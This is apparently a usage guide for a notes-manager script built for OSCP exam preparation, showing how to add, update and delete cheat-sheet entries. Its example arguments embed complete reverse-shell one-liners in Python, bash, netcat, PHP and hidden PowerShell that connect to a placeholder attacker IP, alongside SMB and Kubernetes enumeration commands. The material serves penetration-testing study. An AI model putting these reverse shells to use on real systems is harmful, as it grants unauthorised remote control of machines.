# Python Script Commands & Explanations

## 📦 Installation & Setup

```bash
# Download the script
wget https://raw.githubusercontent.com/yourusername/oscp-cheat-sheet/main/notes_manager.py

# Make it executable
chmod +x notes_manager.py

# Test it works
python3 notes_manager.py list
```

---

## 📚 Basic Commands

### 1. List All Notes
```bash
python3 notes_manager.py list
```
**Explanation**: Displays all button names, their headers, and how many content items each has. Useful for seeing what's currently in your notes.json.

### 2. Show Specific Note
```bash
# Show without decoding (shows base64)
python3 notes_manager.py show "Reverse Shell"

# Show with decoded commands (shows actual commands)
python3 notes_manager.py show "Reverse Shell" --decode
```
**Explanation**: Views the contents of a specific note. Use `--decode` to see the actual commands instead of base64 encoded text.

---

## ➕ Adding Content

### 3. Add New Note (Button)
```bash
python3 notes_manager.py add-note "Redis Enum" "Redis Enumeration Techniques" \
  --content "Check Info" "redis-cli -h <IP> info" \
  --content "Get Keys" "redis-cli -h <IP> keys *"
```
**Explanation**: Creates a new button in the sidebar with multiple command entries. Each `--content` takes two arguments: the sub-header (displayed title) and the actual command.

### 4. Add Content to Existing Note
```bash
# Create new content entry (fails if sub-header exists)
python3 notes_manager.py add-content "Info Gathering For All" "SMB Scan" "smbclient -L //<IP>/ -N"

# Append to existing content (adds more commands to same sub-header)
python3 notes_manager.py add-content "Info Gathering For All" "SMB Scan" "smbmap -H <IP>" --append
```
**Explanation**: 
- Without `--append`: Creates a new section under the button. Errors if that section name already exists.
- With `--append`: Adds more commands to an existing section (great for building command lists).

---

## ✏️ Updating Content

### 5. Update Note Metadata
```bash
# Rename button only
python3 notes_manager.py update-note "Old Name" --new-name "New Button Name"

# Update header only
python3 notes_manager.py update-note "Reverse Shell" --new-header "Advanced Reverse Shells"

# Update both
python3 notes_manager.py update-note "SQLi" --new-name "MySQL Injection" --new-header "Advanced SQL Injection"
```
**Explanation**: Changes the button name or the main header text without affecting the commands inside.

### 6. Update Content
```bash
# Update command only
python3 notes_manager.py update-content "Reverse Shell" "Python Shell" \
  --new-content "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"

# Update sub-header only
python3 notes_manager.py update-content "Reverse Shell" "Python Shell" \
  --new-sub "Python3 Enhanced Shell"

# Update both
python3 notes_manager.py update-content "Reverse Shell" "Python Shell" \
  --new-sub "Python3 RevShell" \
  --new-content "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
```
**Explanation**: Modifies existing command entries. You can change the title (`--new-sub`), the command (`--new-content`), or both.

---

## 🗑️ Deleting Content

### 7. Delete Specific Content
```bash
python3 notes_manager.py delete-content "Info Gathering For All" "WordPress XML-RPC Bruteforce"
```
**Explanation**: Removes a specific command section from a note. The button and other sections remain intact.

### 8. Delete Entire Note
```bash
python3 notes_manager.py delete-note "Old Category Name"
```
**Explanation**: Completely removes a button and all its commands from the sidebar.

---

## 🔄 Advanced Operations

### 9. Overwrite Entire Note
```bash
python3 notes_manager.py overwrite "Reverse Shell" "Complete Reverse Shell Collection" \
  --content "Python3" "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'" \
  --content "Bash" "bash -i >& /dev/tcp/IP/4444 0>&1" \
  --content "Netcat" "nc IP 4444 -e /bin/bash"
```
**Explanation**: Completely replaces everything in an existing note with new content. Useful for restructuring or major updates.

### 10. Append Multiple Lines at Once
```bash
python3 notes_manager.py add-content "Info Gathering For All" "SMB Complete" \
  "smbclient -L //<IP>/ -N
smbmap -H <IP>
enum4linux -a <IP>
nmap --script smb-enum-shares.nse -p445 <IP>
nmap --script smb-os-discovery.nse -p445 <IP>" --append
```
**Explanation**: Adds multiple commands at once to a single section. Each line becomes a separate command when copied.

---

## 💡 Practical Examples

### Example 1: Build a Complete Enumeration Section
```bash
# Create the main button
python3 notes_manager.py add-note "Port 445 SMB" "SMB Enumeration Complete Guide" \
  --content "Quick Scan" "nmap -p445 --script smb-protocols <IP>"

# Add more techniques one by one
python3 notes_manager.py add-content "Port 445 SMB" "Share Enumeration" "smbclient -L //<IP>/ -N" --append
python3 notes_manager.py add-content "Port 445 SMB" "Share Enumeration" "smbmap -H <IP>" --append
python3 notes_manager.py add-content "Port 445 SMB" "Share Enumeration" "crackmapexec smb <IP> --shares" --append

# Add a new section
python3 notes_manager.py add-content "Port 445 SMB" "Vulnerability Scan" "nmap -p445 --script smb-vuln* <IP>"
```

### Example 2: Create Reverse Shell Collection
```bash
python3 notes_manager.py add-note "RevShells" "All Reverse Shell Payloads" \
  --content "Python" "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'" \
  --content "Bash" "bash -i >& /dev/tcp/IP/4444 0>&1" \
  --content "PHP" "php -r '\$sock=fsockopen(\"IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

# Add PowerShell later
python3 notes_manager.py add-content "RevShells" "PowerShell" 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\"IP\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
```

### Example 3: Update Existing Content
```bash
# Fix a typo in command
python3 notes_manager.py update-content "RevShells" "Python" \
  --new-content "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"

# Rename section for clarity
python3 notes_manager.py update-content "RevShells" "Python" --new-sub "Python3 (Linux)"
```

---

## 🚀 Batch Operations Scripts

### Bash One-Liner for Multiple Commands
```bash
# Add multiple commands to same section
for cmd in \
  "whoami" \
  "id" \
  "hostname" \
  "uname -a"; do
  python3 notes_manager.py add-content "Linux Enum" "System Info" "$cmd" --append
done
```

### Python Batch Script
Create `batch_add.py`:
```python
#!/usr/bin/env python3
from notes_manager import NotesManager

manager = NotesManager()

# Add multiple notes at once
notes = [
    ("Docker Enum", "Docker Security", [
        ("List Containers", "docker ps"),
        ("List Images", "docker images"),
        ("Container Info", "docker inspect <container_id>")
    ]),
    ("K8s Enum", "Kubernetes Recon", [
        ("Get Pods", "kubectl get pods -A"),
        ("Get Secrets", "kubectl get secrets -A"),
        ("Get ConfigMaps", "kubectl get configmaps -A")
    ])
]

for button, header, contents in notes:
    manager.add_note(button, header, 
                     [{"sub_header": sub, "content": cmd} for sub, cmd in contents])

print("✅ All notes added successfully!")
```

Run it:
```bash
python3 batch_add.py
```

---

## 🔍 Useful Helper Commands

### Check JSON Syntax
```bash
python3 -m json.tool notes.json > /dev/null && echo "✅ Valid JSON" || echo "❌ Invalid JSON"
```

### Count Total Commands
```bash
python3 -c "import json; data=json.load(open('notes.json')); total=sum(len(n['contents']) for n in data); print(f'Total commands: {total}')"
```

### Find Empty Sections
```bash
python3 -c "import json; data=json.load(open('notes.json')); [print(f\"{n['button_name']}: {c['sub_header']}\") for n in data for c in n['contents'] if not c['content']]"
```

### Backup Current Notes
```bash
cp notes.json notes_$(date +%Y%m%d_%H%M%S).json
```

### Export to Readable Format
```bash
python3 notes_manager.py show "Reverse Shell" --decode > reverse_shells.txt
```

---

## ⚡ Quick Reference Card

| Action | Command |
|--------|---------|
| List all | `python3 notes_manager.py list` |
| Show note | `python3 notes_manager.py show "NAME" --decode` |
| Add note | `python3 notes_manager.py add-note "BUTTON" "HEADER" --content "SUB" "CMD"` |
| Add content | `python3 notes_manager.py add-content "BUTTON" "SUB" "CMD"` |
| Append content | `python3 notes_manager.py add-content "BUTTON" "SUB" "CMD" --append` |
| Update note | `python3 notes_manager.py update-note "OLD" --new-name "NEW"` |
| Update content | `python3 notes_manager.py update-content "BTN" "SUB" --new-content "CMD"` |
| Delete content | `python3 notes_manager.py delete-content "BUTTON" "SUB"` |
| Delete note | `python3 notes_manager.py delete-note "BUTTON"` |
| Overwrite note | `python3 notes_manager.py overwrite "BTN" "HEADER" --content "SUB" "CMD"` |

---

## 💡 Pro Tips

1. **Always test with `--decode` first** before using commands in live environments
2. **Use `--append` for related commands** to keep them organized under one sub-header
3. **Backup before bulk operations**: `cp notes.json notes.json.backup`
4. **Version control your notes.json** with git to track changes
5. **Use descriptive sub-headers** so you can quickly find commands during exams
6. **Add comments in commands** using `#` to remember syntax variations
7. **Keep IP and port placeholders** like `<IP>` and `PORT` for easy find/replace
